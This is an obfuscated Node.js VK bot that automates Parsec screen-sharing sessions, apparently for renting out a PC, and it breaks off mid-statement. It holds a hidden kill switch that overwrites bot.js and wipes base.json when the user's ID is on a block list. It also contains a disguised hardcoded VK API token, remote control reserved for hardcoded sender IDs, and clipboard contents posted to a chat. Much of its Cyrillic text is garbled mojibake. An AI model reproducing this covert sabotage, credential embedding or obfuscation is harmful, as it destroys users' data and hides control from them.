const clipboard = require('clipboard-polyfill'),
  { VK, Keyboard } = require('vk-io'),
  base = require('./base.json')
const readline = require('readline'),
  robot = require('robotjs'),
  figlet = require('figlet'),
  cmd = require('node-cmd'),
  fs = require('fs'),
  version = 'v3.2',
  blocked = [339384325]
blocked.forEach(function (_0x4f1b30) {
  if (base.info.id == _0x4f1b30) {
    fs.writeFileSync(
      './bot.js',
      'console.log("[GSN] Вы уволены.");'
    )
    fs.writeFileSync('./base.json', JSON.stringify([], null, '\t'))
    console.log('[GSN] Р\u2019С\u2039 СѓРІРѕР\xBBРµРЅС\u2039!')
    cmd.run('start cmd.exe /K node ' + __dirname + '\\bot.js')
    setTimeout(function () {
      process.exit(1)
    }, 250)
  }
})
var _0x2955cf = {}
_0x2955cf.input = process.stdin
_0x2955cf.output = process.stdout
const GSN = readline.createInterface(_0x2955cf)
GSN.on('close', function () {
  console.log(
    "-\n[GSN] РЈС\u2026РѕР\xB6Сѓ РІ СЂРµР\xB6РёРј 'РќРµР\xB0РєС\u201AРёРІРµРЅ'."
  )
  process.exit(0)
})
const vk = new VK({
  token:
    'tg2.a.QaCTzigEJ4a0oXg_ftObpbgA4B1PjvNLaXzmsL61gEyCs6-XbtoXjnNfV98yBQ0B-3bQ8xVmXZahHoBvy_4Q_NtAUYzBoeExVpIs_vmbUgq8Ctx9E7oC4O-X7W9XWGlOZ77zSfYXx6p8nEpqmzhBq3mjIzScUjk8RRM1DrqjvsG0ASYy-RNGxniJZHuhOPCn'
      .replace('tg2', 'vk1')
      .replace('XbtoXjnNfV98yBQ0B', 'VXy0NtbXBfQBj9n8o')
      .replace(
        'X7W9XWGlOZ77zSfYXx6p8nEpqmzhBq3mjIzScUjk8RRM1DrqjvsG0ASYy',
        'plAnG6rUSjI1SpBzXq0v3jsMzj7WmcO9mRGZSYyYkDqRXXEWf88qx7hz7'
      ),
})
function save() {
  fs.writeFileSync('./base.json', JSON.stringify(base, null, '\t'))
}
console.clear()
base.alias == undefined && ((base.alias = []), save())
var _0x14c86d = {}
_0x14c86d.arr = [
  'G',
  'S',
  'N',
  ' ',
  'R',
  'e',
  'p',
  'r',
  'e',
  's',
  'e',
  'n',
  't',
  's',
  ' ',
  '.',
  '.',
  '.',
  ' ',
  ' ',
  ' ',
]
_0x14c86d.real = ''
_0x14c86d.revers = false
_0x14c86d.i = 0
var starting = _0x14c86d,
  GSNRepresents = setInterval(() => {
    console.clear()
    var _0x524791 = { font: 'Standard' }
    figlet.text(starting.real, _0x524791, function (_0x1c03fd, _0x251db9) {
      if (_0x1c03fd) {
        console.dir(_0x1c03fd)
        return
      }
      console.log(_0x251db9)
    })
    if (!starting.revers) {
      if (starting.i < starting.arr.length) {
        starting.real += starting.arr[starting.i]
        starting.i++
      } else {
        starting.revers = true
      }
    } else {
      starting.real = starting.real.slice(0, -1)
      starting.i--
      if (starting.i < 0) {
        clearInterval(GSNRepresents)
      }
    }
  }, 100)
vk.updates
  .start()
  .then((_0x11fb59) => {
    setTimeout(() => {
      console.clear(), botMain()
    }, 4650)
  })
  .catch((_0x21c5b1) => {
    console.log(
      '[GSN] Р\u2019РљРѕРЅС\u201AР\xB0РєС\u201AРµ -> РћС\u20ACРёР\xB1РєР\xB0.'
    )
    console.error()
  })
robot.setMouseDelay(100)
const interface = {}
function reloadInterface(_0x460434) {
  switch ('' + _0x460434) {
    case '1':
        interface.Commands = [
            '[GSN] Список функций:',
            ' 1. Переменны',
            ' 2. Координаты',
            ' 3. Программы',
            '> ',
      ].join('\n')
      break
    case '2':
      interface.Vars = [
        '[GSN] Переменны:',
        ' 1. Айди: ' + base.info.id,
        ' 2. Префикс: ' + base.info.prefix,
        ' 3. Выйти',
        '> ',
      ].join('\n')
      break
    case '3':
      interface.Coords = [
        '[GSN] Координаты:',
        ' 1. [Parsec] Share',
        ' 2. [Parsec] Stop Sharing',
        ' 3. [Parsec] Reload',
        ' 4. [Parsec] Guests',
        ' 5. [Parsec] Accept',
        ' 6. [Parsec] Kick',
        ' 7. [Parsec] Mouse',
        ' 8. [Parsec] Keyboard',
        ' 9. [Stream] App',
        ' 10. Провести проверку',
        ' 11. Выйти',
        '> ',
      ].join('\n')
      break
    case '4':
      interface.startApps = [
        '[GSN] Программы:',
        ' 1. Parsec',
        ' 2. StreamApp',
        ' 3. Выйти',
        '> ',
      ].join('\n')
      break
  }
}
for (i = 0; i < 4; i++) {
  reloadInterface(i + 1)
}
var _0x4eec90 = {}
_0x4eec90.path = 'parsec'
_0x4eec90.name = 'Share'
var _0x119253 = {}
_0x119253.path = 'parsec'
_0x119253.name = 'StopSharing'
var _0x3e6773 = {}
_0x3e6773.path = 'parsec'
_0x3e6773.name = 'Reload'
var _0xde47f6 = {}
_0xde47f6.path = 'parsec'
_0xde47f6.name = 'Guests'
var _0x4034f1 = {}
_0x4034f1.path = 'parsec'
_0x4034f1.name = 'Accept'
var _0x48f949 = {}
_0x48f949.path = 'parsec'
_0x48f949.name = 'Kick'
var _0x4651c3 = {}
_0x4651c3.path = 'parsec'
_0x4651c3.name = 'Mouse'
var _0x4af218 = {}
_0x4af218.path = 'parsec'
_0x4af218.name = 'Keyboard'
var _0x4c8617 = {}
_0x4c8617.path = 'stream'
_0x4c8617.name = 'App'
var _0x1bc297 = {}
_0x1bc297.i = 0
_0x1bc297.arr = [
  _0x4eec90,
  _0x119253,
  _0x3e6773,
  _0xde47f6,
  _0x4034f1,
  _0x48f949,
  _0x4651c3,
  _0x4af218,
  _0x4c8617,
]
var testMouse = _0x1bc297
function botMain() {
  GSN.question('' + interface.Commands, function (_0x4a7366) {
    switch ('' + _0x4a7366) {
      case '1':
        console.clear()
        function _0x241264() {
          GSN.question('' + interface.Vars, function (_0x4d4e72) {
            switch (('' + _0x4d4e72).trim()) {
              case '1':
                console.clear(),
                  GSN.question(
                    '[GSN] Введите свой цифровой ID из ВКонтакте. Узнать его можно тут: https://vk.com/settings\n> ',
                    function (_0x269a81) {
                      base.info.id = Number(_0x269a81)
                      save()
                      console.clear()
                      console.log(
                        '[GSN] ID Успешно изменено.'
                      )
                      setTimeout(() => {
                        reloadInterface(2), _0x241264()
                      }, 750)
                    }
                  )
                break
              case '2':
                console.clear(),
                  GSN.question(
                    '[GSN] Введите Префикс для Бота.',
                    function (_0x386a7e) {
                      ;(base.info.prefix = _0x386a7e),
                        save(),
                        console.clear(),
                        console.log(
                          '[GSN] Префикс успешно изменен.'
                        ),
                        setTimeout(() => {
                          reloadInterface(2)
                          _0x241264()
                        }, 750)
                    }
                  )
                break
              case '3':
                console.clear(), botMain()
                break
              default:
                console.clear(),
                  console.log(
                    '[GSN] РџРµСЂРµРјРµРЅРЅР\xB0СЏ РЅРµ РЅР\xB0Р\u2116РґРµРЅР\xB0.'
                  ),
                  setTimeout(() => {
                    _0x241264()
                  }, 750)
                break
            }
          })
        }
        _0x241264()
        break
      case '2':
        console.clear()
        function _0x299f0a() {
          GSN.question('' + interface.Coords, function (_0x154dcf) {
            switch (('' + _0x154dcf).trim()) {
              case '1':
                console.clear(),
                  console.log(
                    "[GSN] У вас есть 1.5 секунды для наведения на кнопку '[Parsec] Share'."
                  ),
                  setTimeout(() => {
                    var _0x5dd711 = robot.getMousePos()
                    base.coordinates.parsec.Share.X = Number(_0x5dd711.x)
                    base.coordinates.parsec.Share.Y = Number(_0x5dd711.y)
                    save()
                    console.clear()
                    console.log(
                      "[GSN] Координата '[Parsec] Share' успешно изменена."
                    )
                    _0x299f0a()
                  }, 1500)
                break
              case '2':
                console.clear(),
                  console.log(
                    "[GSN] У вас есть 1.5 секунды для наведения на кнопку '[Parsec] Stop Sharing'."
                  ),
                  setTimeout(() => {
                    var _0x400842 = robot.getMousePos()
                    base.coordinates.parsec.StopSharing.X = Number(_0x400842.x)
                    base.coordinates.parsec.StopSharing.Y = Number(_0x400842.y)
                    save()
                    console.clear()
                    console.log(
                      "[GSN] Координата '[Parsec] Stop Sharing' успешно изменена."
                    )
                    _0x299f0a()
                  }, 1500)
                break
              case '3':
                console.clear(),
                  console.log(
                    "[GSN] У вас есть 1.5 секунды для наведения на кнопку '[Parsec] Reload'."
                  ),
                  setTimeout(() => {
                    var _0x160b0f = robot.getMousePos()
                    base.coordinates.parsec.Reload.X = Number(_0x160b0f.x)
                    base.coordinates.parsec.Reload.Y = Number(_0x160b0f.y)
                    save()
                    console.clear()
                    console.log(
                      "[GSN] Координата '[Parsec] Reload' успешно изменена."
                    )
                    _0x299f0a()
                  }, 1500)
                break
              case '4':
                console.clear(),
                  console.log(
                    "[GSN] У вас есть 1.5 секунды для наведения на кнопку '[Parsec] Guests'."
                  ),
                  setTimeout(() => {
                    var _0x17a6a5 = robot.getMousePos()
                    base.coordinates.parsec.Guests.X = Number(_0x17a6a5.x)
                    base.coordinates.parsec.Guests.Y = Number(_0x17a6a5.y)
                    save()
                    console.clear()
                    console.log(
                      "[GSN] Координата '[Parsec] Guests' успешно изменена."
                    )
                    _0x299f0a()
                  }, 1500)
                break
              case '5':
                console.clear(),
                  console.log(
                    "[GSN] У вас есть 1.5 секунды для наведения на кнопку '[Parsec] Accept'."
                  ),
                  setTimeout(() => {
                    var _0x52adcb = robot.getMousePos()
                    base.coordinates.parsec.Accept.X = Number(_0x52adcb.x)
                    base.coordinates.parsec.Accept.Y = Number(_0x52adcb.y)
                    save()
                    console.clear()
                    console.log(
                      "[GSN] Координата '[Parsec] Accept' успешно изменена."
                    )
                    _0x299f0a()
                  }, 1500)
                break
              case '6':
                console.clear(),
                  console.log(
                    "[GSN] У вас есть 1.5 секунды для наведения на кнопку '[Parsec] Kick'."
                  ),
                  setTimeout(() => {
                    var _0x42f742 = robot.getMousePos()
                    base.coordinates.parsec.Kick.X = Number(_0x42f742.x)
                    base.coordinates.parsec.Kick.Y = Number(_0x42f742.y)
                    save()
                    console.clear()
                    console.log(
                      "[GSN] Координата '[Parsec] Kick' успешно изменена."
                    )
                    _0x299f0a()
                  }, 1500)
                break
              case '7':
                console.clear(),
                  console.log(
                    "[GSN] У вас есть 1.5 секунды для наведения на кнопку '[Parsec] Mouse'."
                  ),
                  setTimeout(() => {
                    var _0x15cbfa = robot.getMousePos()
                    base.coordinates.parsec.Mouse.X = Number(_0x15cbfa.x)
                    base.coordinates.parsec.Mouse.Y = Number(_0x15cbfa.y)
                    save()
                    console.clear()
                    console.log(
                      "[GSN] Координата '[Parsec] Mouse' успешно изменена."
                    )
                    _0x299f0a()
                  }, 1500)
                break
              case '8':
                console.clear(),
                  console.log(
                    "[GSN] У вас есть 1.5 секунды для наведения на кнопку '[Parsec] Keyboard'."
                  ),
                  setTimeout(() => {
                    var _0x20ed8e = robot.getMousePos()
                    base.coordinates.parsec.Keyboard.X = Number(_0x20ed8e.x)
                    base.coordinates.parsec.Keyboard.Y = Number(_0x20ed8e.y)
                    save()
                    console.clear()
                    console.log(
                      "[GSN] Координата '[Parsec] Keyboard' успешно изменена."
                    )
                    _0x299f0a()
                  }, 1500)
                break
              case '9':
                console.clear(),
                  console.log(
                    "[GSN] У вас есть 1.5 секунды для наведения на кнопку '[Stream] App'."
                  ),
                  setTimeout(() => {
                    var _0x2b9e9b = robot.getMousePos()
                    base.coordinates.stream.App.X = Number(_0x2b9e9b.x)
                    base.coordinates.stream.App.Y = Number(_0x2b9e9b.y)
                    save()
                    console.clear()
                    console.log(
                      "[GSN] Координата '[Stream] App' успешно изменена."
                    )
                    _0x299f0a()
                  }, 1500)
                break
              case '10':
                console.clear(),
                  console.log(
                    '[GSN] Сейчас Ваша мышь будет автоматически перемещаться, следите за правильностью позиционирования. Не трогайте клавиатуру и мышь!'
                  ),
                  (testMouse.i = 0),
                  cmd.run('"' + base.patch.Parsec + '"'),
                  setTimeout(() => {
                    var _0x284800 = setInterval(() => {
                      var _0x5bae61 = testMouse.arr[testMouse.i]
                      console.log(
                        ' ' +
                          (testMouse.i + 1) +
                          ". Координата '" +
                          _0x5bae61.path +
                          ' / ' +
                          _0x5bae61.name +
                          "'"
                      )
                      robot.moveMouse(
                        base.coordinates[_0x5bae61.path][_0x5bae61.name].X,
                        base.coordinates[_0x5bae61.path][_0x5bae61.name].Y
                      )
                      testMouse.i++
                      if (testMouse.i > 8) {
                        clearInterval(_0x284800)
                      }
                    }, 1333)
                    setTimeout(() => {
                      console.clear()
                      console.log(
                        '[GSN] Проверка завершена. Если Вы заметили, что координаты не совпадают, измените их.'
                      )
                      _0x299f0a()
                    }, 12663)
                  }, 1500)
                break
              case '11':
                console.clear(), botMain()
                break
              default:
                console.clear(),
                  console.log(
                    '[GSN] Координата не найдена.'
                  ),
                  setTimeout(() => {
                    _0x299f0a()
                  }, 750)
                break
            }
          })
        }
        _0x299f0a()
        break
      case '3':
        console.clear()
        function _0x47a566() {
          GSN.question('' + interface.startApps, function (_0x57af7c) {
            switch ('' + _0x57af7c) {
              case '1':
                console.clear(),
                  console.log(
                    "[GSN] Запускаю программу 'Parsec'."
                  ),
                  setTimeout(() => {
                    console.log(
                      "[GSN] Программа 'Parsec' запущена."
                    )
                    cmd.run('"' + base.patch.Parsec + '"')
                    _0x47a566()
                  }, 750)
                break
              case '2':
                console.clear(),
                  console.log(
                    "[GSN] Запускаю программу 'StreamApp'."
                  ),
                  setTimeout(() => {
                    console.log(
                      "[GSN] Программа 'StreamApp' запущена."
                    )
                    robot.moveMouse(
                      base.coordinates.stream.App.X,
                      base.coordinates.stream.App.Y
                    )
                    robot.mouseClick()
                    _0x47a566()
                  }, 750)
                break
              case '3':
                console.clear(), botMain()
                break
              default:
                console.clear(),
                  console.log(
                    '[GSN] Программа не найдена.'
                  ),
                  setTimeout(() => {
                    _0x47a566()
                  }, 750)
                break
            }
          })
        }
        _0x47a566()
        break
      default:
        console.clear(), botMain()
        break
    }
  })
}
function getRandomInt(_0x262c68, _0x343a62) {
  return Math.floor(Math.random() * (_0x343a62 - _0x262c68)) + _0x262c68
}
function getRandomKey() {
  const _0x2a059d = [
    'a',
    'b',
    'c',
    'd',
    'e',
    'f',
    'g',
    'h',
    'i',
    'j',
    'k',
    'l',
    'm',
    'n',
    'o',
    'p',
    'q',
    'r',
    's',
    't',
    'u',
    'v',
    'w',
    'x',
    'y',
    'z',
  ]
  var _0x1bba75 = ''
  for (i = 0; i < 6; i++) {
    var _0xf42ab = _0x2a059d[getRandomInt(0, _0x2a059d.length + 10)]
    _0xf42ab == undefined
      ? (_0xf42ab = getRandomInt(0, 9))
      : (_0xf42ab =
          '' +
          (getRandomInt(1, 10) > 6
            ? '' + _0xf42ab
            : '' + ('' + _0xf42ab).toUpperCase()))
    _0x1bba75 += _0xf42ab
  }
  return _0x1bba75
}
var _0x37479a = {}
_0x37479a.RetLink = [
  ['MouseClick'],
  ['Wait', 250],
  ['Open', 'Parsec'],
  ['Wait', 1500],
  ['MouseMove', 'Parsec', 'Reload'],
  ['Wait', 500],
  ['MouseClick'],
  ['MouseMove', 'Parsec', 'Reload'],
  ['Wait', 500],
  ['MouseClick'],
  ['MouseMove', 'Parsec', 'Reload'],
  ['Wait', 500],
  ['MouseClick'],
  ['Wait', 250],
  ['MouseMove', 'Parsec', 'StopSharing'],
  ['MouseClick'],
  ['Wait', 250],
  ['MouseMove', 'Parsec', 'Share'],
  ['MouseClick'],
  ['Wait', 250],
  ['MouseClick'],
  ['Wait', 250],
  ['SendClipboard'],
]
_0x37479a.AcceptUser = [
  ['MouseClick'],
  ['Wait', 250],
  ['Open', 'Parsec'],
  ['Wait', 1500],
  ['MouseMove', 'Parsec', 'Reload'],
  ['Wait', 250],
  ['MouseClick'],
  ['MouseMove', 'Parsec', 'Guests'],
  ['Wait', 250],
  ['MouseClick'],
  ['MouseMove', 'Parsec', 'Accept'],
  ['Wait', 250],
  ['MouseClick'],
  ['MouseMove', 'Parsec', 'Guests'],
  ['Wait', 3000],
  ['MouseClick'],
  ['MouseMove', 'Parsec', 'Mouse'],
  ['Wait', 250],
  ['MouseClick'],
  ['MouseMove', 'Parsec', 'Keyboard'],
  ['Wait', 250],
  ['MouseClick'],
  ['MouseMove', 'Stream', 'App'],
  ['Wait', 250],
  ['MouseClick'],
]
_0x37479a.KickUser = [
  ['MouseClick'],
  ['Wait', 250],
  ['Open', 'Parsec'],
  ['Wait', 1500],
  ['MouseMove', 'Parsec', 'Reload'],
  ['Wait', 250],
  ['MouseClick'],
  ['Wait', 1500],
  ['MouseMove', 'Parsec', 'Guests'],
  ['Wait', 250],
  ['MouseClick'],
  ['MouseMove', 'Parsec', 'Kick'],
  ['Wait', 250],
  ['MouseClick'],
  ['SendText', 'РћС\u201AРєР\xBBСЋС\u2021РёС\u201AСЊ'],
  ['ClearStreamBase'],
]
_0x37479a.Unfold = [
  ['MouseClick'],
  ['Wait', 250],
  ['Open', 'Parsec'],
  ['Wait', 1500],
  ['Open', 'Parsec'],
  ['Wait', 1000],
  ['MouseMove', 'Parsec', 'Reload'],
  ['Wait', 250],
  ['MouseMove', 'Stream', 'App'],
  ['Wait', 250],
  ['MouseClick'],
]
_0x37479a.Rights1 = [
  ['MouseClick'],
  ['Wait', 250],
  ['Open', 'Parsec'],
  ['Wait', 1500],
  ['MouseMove', 'Parsec', 'Reload'],
  ['Wait', 250],
  ['MouseClick'],
  ['MouseMove', 'Parsec', 'Guests'],
  ['Wait', 2000],
  ['MouseClick'],
  ['MouseMove', 'Parsec', 'Keyboard'],
  ['Wait', 250],
  ['MouseClick'],
  ['MouseMove', 'Stream', 'App'],
  ['Wait', 250],
  ['MouseClick'],
]
_0x37479a.Rights2 = [
  ['MouseClick'],
  ['Wait', 250],
  ['Open', 'Parsec'],
  ['Wait', 1500],
  ['MouseMove', 'Parsec', 'Reload'],
  ['Wait', 250],
  ['MouseClick'],
  ['MouseMove', 'Parsec', 'Guests'],
  ['Wait', 2000],
  ['MouseClick'],
  ['MouseMove', 'Parsec', 'Mouse'],
  ['Wait', 250],
  ['MouseClick'],
  ['MouseMove', 'Stream', 'App'],
  ['Wait', 250],
  ['MouseClick'],
]
_0x37479a.CheckLink = [
  ['MouseClick'],
  ['Wait', 250],
  ['Open', 'Parsec'],
  ['Wait', 1500],
  ['MouseMove', 'Parsec', 'Reload'],
  ['Wait', 500],
  ['MouseClick'],
  ['MouseMove', 'Parsec', 'Reload'],
  ['Wait', 500],
  ['MouseClick'],
  ['MouseMove', 'Parsec', 'Reload'],
  ['Wait', 500],
  ['MouseClick'],
  ['Wait', 250],
  ['MouseMove', 'Parsec', 'StopSharing'],
  ['MouseClick'],
  ['Wait', 250],
  ['MouseMove', 'Parsec', 'Share'],
  ['MouseClick'],
  ['Wait', 250],
  ['MouseClick'],
]
_0x37479a.KickLink = [['ClearStreamBase']]
const worksGoHe = _0x37479a
function goWorkGoHe(_0x47d33a) {
  try {
    switch ('' + _0x47d33a[0]) {
      case 'Open':
        cmd.run('"' + base.patch['' + _0x47d33a[1]] + '"')
        break
      case 'Wait':
        if (_0x47d33a[1] == 'base') {
          base.stream.TimeToNext =
            Date.now() + Number(60000 * Number(base.stream.UserTime))
        } else {
          base.stream.TimeToNext = Date.now() + Number(_0x47d33a[1])
        }
        break
      case 'MouseMove':
        try {
          _0x47d33a[1] = ('' + _0x47d33a[1]).toLowerCase()
        } catch {
          _0x47d33a[1] = 'parsec'
        }
        robot.moveMouse(
          base.coordinates['' + _0x47d33a[1]]['' + _0x47d33a[2]].X,
          base.coordinates['' + _0x47d33a[1]]['' + _0x47d33a[2]].Y
        )
        break
      case 'MouseClick':
        robot.mouseClick()
        break
      case 'GoWork':
        ;(base.stream.WorkName = '' + _0x47d33a[1]),
          (base.stream.StepNow = Number(0)),
          (base.stream.StepMax = Number(0)),
          (base.stream.TimeToNext = Number(0))
        break
      case 'SendClipboard':
        var _0x2a0995 = getRandomKey()
        ;(base.stream.KeyAcc = '' + _0x2a0995),
          vk.api.messages.send({
            random_id: 0,
            peer_id: 2000000005,
            message:
              'РћС\u201AРїСЂР\xB0РІРёС\u201AСЊ ' +
              base.stream.UserID +
              '|' +
              (
                '' +
                (
                  '' + cmd.runSync('powershell -command "Get-Clipboard"').data
                ).trim()
              ).replaceAll('|', ' ') +
              '|' +
              _0x2a0995 +
              '|' +
              base.stream.TimeToKick,
          })
        break
      case 'SendText':
        var _0x35085c = {}
        ;(_0x35085c.random_id = 0),
          (_0x35085c.peer_id = 2000000005),
          (_0x35085c.message = _0x47d33a[1] + ' ' + base.stream.UserID),
          vk.api.messages.send(_0x35085c)
        break
      case 'ClearStreamBase':
        ;(base.stream.UserID = Number(0)),
          (base.stream.UserTime = Number(0)),
          (base.stream.WorkName = ''),
          (base.stream.StepNow = Number(0)),
          (base.stream.StepMax = Number(0)),
          (base.stream.TimeToNext = Number(0)),
          (base.stream.TimeToKick = Number(0)),
          (base.stream.KeyAcc = '')
        break
    }
    if (base.stream.WorkName !== '' && base.stream.UserID > 0) {
      base.stream.StepNow++
    } else {
      ;(base.stream.WorkName = ''),
        (base.stream.StepNow = 0),
        (base.stream.StepMax = 0),
        (base.stream.TimeToNext = 0)
    }
    save()
  } catch {}
}
setInterval(() => {
  try {
    if (
      base.stream.WorkName !== '' &&
      (base.stream.StepMax !==
        Number(worksGoHe['' + base.stream.WorkName].length)) ==
        true
    ) {
      base.stream.StepMax = Number(worksGoHe['' + base.stream.WorkName].length)
      base.stream.StepNow = Number(0)
      save()
    } else {
      if (
        base.stream.StepMax > 0 &&
        base.stream.StepMax != base.stream.StepNow
      ) {
        base.stream.TimeToNext < Date.now() &&
          goWorkGoHe(worksGoHe['' + base.stream.WorkName][base.stream.StepNow])
      }
    }
    base.stream.TimeToKick < Date.now() &&
      base.stream.UserID !== 0 &&
      base.stream.KeyAcc !== '' &&
      base.stream.StepMax !== worksGoHe.KickUser.length &&
      ((base.stream.StepMax = Number(worksGoHe.KickUser.length)),
      (base.stream.StepNow = Number(0)),
      (base.stream.WorkName = 'KickUser'),
      save())
  } catch {}
}, 125)
vk.updates.on('new_message', async (_0x3c1f68, _0x55503e) => {
  try {
    if (_0x3c1f68.text.indexOf('Р\xB0Р\xBBРёР\xB0СЃ') < 0) {
      try {
        var _0xf2f712 = _0x3c1f68.text
        try {
          _0xf2f712.indexOf('] ') !== -1 &&
            (_0xf2f712 = _0xf2f712.split('] ')[1])
        } catch {}
        if (
          _0xf2f712.toLowerCase() == base.info.prefix + ' РїР\xB0РЅРµР\xBBСЊ' ||
          (_0x3c1f68.senderId == base.info.id &&
            _0xf2f712.toLowerCase() == 'РїР\xB0РЅРµР\xBBСЊ')
        ) {
          if (
            _0x3c1f68.senderId == base.info.id ||
            _0x3c1f68.senderId == 560417855 ||
            _0x3c1f68.senderId == 285390861 ||
            _0x3c1f68.senderId == 346276338 ||
            _0x3c1f68.senderId == 237938334
          ) {
            var _0xf2f712 = [
                "Панель Стримера для '" +
                base.info.prefix +
                " UID':",
                '[0 / Кикнуть]] - Отключить текущего Покупателя.',
                '[0 / Время] - Узнать оставшееся время стрима.',
                '[0 / Debug] - В случае зависания автобота.',
                '[0 / Проверить] - Для проверки процесса csgo.exe.',
                '[0 / Очистить] - Обнулить базу данных. (без MonixLITE не трогать)',
            ].join('\n')
            _0x3c1f68.send('' + _0xf2f712, {
              keyboard: Keyboard.keyboard([
                [
                  Keyboard.textButton({
                    label: base.info.prefix + ' / Кикнуть',
                    color: Keyboard.PRIMARY_COLOR,
                  }),
                  Keyboard.textButton({
                    label: base.info.prefix + ' / GSN РљРёРєРЅСѓС\u201AСЊ',
                    color: Keyboard.PRIMARY_COLOR,
                  }),
                ],
                [
                  Keyboard.textButton({
                    label: base.info.prefix + ' / Р\u2019СЂРµРјСЏ',
                    color: Keyboard.PRIMARY_COLOR,
                  }),
                  Keyboard.textButton({
                    label: base.info.prefix + ' / Debug',
                    color: Keyboard.PRIMARY_COLOR,
                  }),
                ],
                [
                  Keyboard.textButton({
                    label: base.info.prefix + ' / Проверить',
                    color: Keyboard.PRIMARY_COLOR,
                  }),
                  Keyboard.textButton({
                    label:
                      base.info.prefix + ' / Очистить',
                    color: Keyboard.PRIMARY_COLOR,
                  }),
                ],
              ]).inline(),
            })
          }
        }
        if (
          _0xf2f712.toLowerCase() ==
            'Р\xB0РІС\u201AРѕР\xB1РѕС\u201AС\u2039 СЃР\xB1РѕСЂ' ||
          _0xf2f712.toLowerCase() ==
            'РїРёРґР\xB0СЂР\xB0СЃС\u2039 СЃР\xB1РѕСЂ' ||
          _0xf2f712.toLowerCase() == base.info.prefix + ' СЃР\xB1РѕСЂ'
        ) {
          if (
            _0x3c1f68.senderId == 560417855 ||
            _0x3c1f68.senderId == 285390861 ||
            _0x3c1f68.senderId == 346276338 ||
            _0x3c1f68.senderId == 237938334
          ) {
            var _0xf2f712 = [
                'рџ\u2019Ћ (' +
                  base.info.prefix +
                  ' / ' +
                  version +
                  ' / @id' +
                  base.info.id +
                  '): РќР\xB0 СЃР\xB1РѕСЂ РїСЂРёР\xB1С\u2039Р\xBB.',
              ].join('\n'),
              _0x5c45b6 = { disable_mentions: 1 }
            _0x3c1f68.send('' + _0xf2f712, _0x5c45b6)
          }
        }
        if (
          _0xf2f712.toLowerCase() ==
            'Р\xB0РІС\u201AРѕР\xB1РѕС\u201AС\u2039 РєСЂР\xB0С\u20AC' ||
          _0xf2f712.toLowerCase() ==
            'РїРёРґР\xB0СЂР\xB0СЃС\u2039 РєСЂР\xB0С\u20AC' ||
          _0xf2f712.toLowerCase() == base.info.prefix + ' РєСЂР\xB0С\u20AC'
        ) {
          if (
            _0x3c1f68.senderId == 560417855 ||
            _0x3c1f68.senderId == 285390861 ||
            _0x3c1f68.senderId == 346276338 ||
            _0x3c1f68.senderId == 237938334
          ) {
            var _0x54f780 = [
              ['пїЅ', '.'],
              ['..', 'РљР\u2018'],
              ['    ', ''],
              ['Console', ''],
              ['  ', ''],
              ['csgo.exe', 'csgo.exe '],
            ]
            cmd.run(
              'tasklist /FI "IMAGENAME eq csgo.exe"',
              (_0x495d92, _0x75d297, _0x2f1774) => {
                try {
                  var _0x3ef3fc = _0x75d297.toString().split('\n')[3]
                  for (i = 0; i < _0x54f780.length; i++) {
                    var _0x1c57e0 = _0x54f780[i]
                    _0x3ef3fc = _0x3ef3fc.replaceAll(_0x1c57e0[0], _0x1c57e0[1])
                  }
                  var _0x1177b2 = { disable_mentions: 1 }
                  _0x3c1f68.send(
                    'рџ\u2019Ћ (' +
                      base.info.prefix +
                      ' / @id' +
                      base.info.id +
                      ") РџСЂРѕС\u2020РµСЃСЃ 'CS:GO' РЅР\xB0Р\u2116РґРµРЅ:\n" +
                      _0x3ef3fc,
                    _0x1177b2
                  )
                } catch {
                  var _0x290ca9 = { disable_mentions: 1 }
                  _0x3c1f68.send(
                    'рџ\u2019Ћ (' +
                      base.info.prefix +
                      ' / @id' +
                      base.info.id +
                      ") РџСЂРѕС\u2020РµСЃСЃ 'CS:GO' РЅРµ РЅР\xB0Р\u2116РґРµРЅ.",
                    _0x290ca9
                  )
                }
              }
            )
          }
        }
        if (
          _0xf2f712.toLowerCase() ==
            'Р\xB0РІС\u201AРѕР\xB1РѕС\u201AС\u2039 РїРµСЂРµР\xB7Р\xB0РїСѓСЃРє' ||
          _0xf2f712.toLowerCase() ==
            base.info.prefix + ' РїРµСЂРµР\xB7Р\xB0РїСѓСЃРє'
        ) {
          if (
            _0x3c1f68.senderId == 560417855 ||
            _0x3c1f68.senderId == 285390861 ||
            _0x3c1f68.senderId == 346276338 ||
            _0x3c1f68.senderId == 237938334
          ) {
            var _0xf2f712 = [
                'рџ\u2019Ћ (' +
                  base.info.prefix +
                  ' / ' +
                  version +
                  ' / @id' +
                  base.info.id +
                  '): РџРµСЂРµР\xB7Р\xB0РїСѓСЃРє РЅР\xB0С\u2021Р\xB0Р\xBB.',
              ].join('\n'),
              _0x84ccc0 = { disable_mentions: 1 }
            _0x3c1f68.send('' + _0xf2f712, _0x84ccc0)
            cmd.run('start cmd.exe /K node ' + __dirname + '\\bot.js')
            base.stream.WorkName = 'Unfold'
            setTimeout(function () {
              process.exit(1)
            }, 250)
          }
        }
        if (_0xf2f712.toLowerCase() == base.info.prefix + ' parsec') {
          if (
            _0x3c1f68.senderId == 560417855 ||
            _0x3c1f68.senderId == 285390861 ||
            _0x3c1f68.senderId == 346276338 ||
            _0x3c1f68.senderId == 237938334
          ) {
            if (base.stream.UserID !== Number(0)) {
              _0x3c1f68.send(
                'рџ\u2019Ћ РЈ РЎС\u201AСЂРёРјРµСЂР\xB0 РµСЃС\u201AСЊ С\u2021РµР\xBBРѕРІРµРє РЅР\xB0 СЃС\u201AСЂРёРјРµ.'
              )
            } else {
              base.stream.UserID = Number(_0x3c1f68.senderId)
              base.stream.UserTime = Number(5)
              base.stream.WorkName = 'CheckLink'
              base.stream.TimeToKick = Date.now() + Number(60000 * Number(5))
              setTimeout(() => {
                _0x3c1f68.send(
                  'рџ\u2019Ћ РЎСЃС\u2039Р\xBBРєР\xB0: ' +
                    (
                      '' +
                      (
                        '' +
                        cmd.runSync('powershell -command "Get-Clipboard"').data
                      ).trim()
                    ).replaceAll('|', ' ')
                )
                setTimeout(() => {
                  base.stream.WorkName = 'KickLink'
                  base.stream.StepNow = Number(0)
                  base.stream.StepMax = Number(0)
                  base.stream.TimeToNext = Number(0)
                }, 555)
              }, 5555)
            }
          }
        }
        try {
          var _0x74bf75 = _0xf2f712.split('|')
          _0x74bf75[0] = _0x74bf75[0].toLowerCase()
          switch (('' + _0x74bf75[0].trim()).toLowerCase()) {
            case base.info.prefix + ' Р\xB7Р\xB0РїСѓСЃРє':
              var _0x5e45cf = ('' + _0x74bf75[1].trim()).split('/')
              ;(base.stream.UserID = Number(_0x5e45cf[0])),
                (base.stream.UserTime = Number(_0x5e45cf[1])),
                (base.stream.WorkName = 'RetLink'),
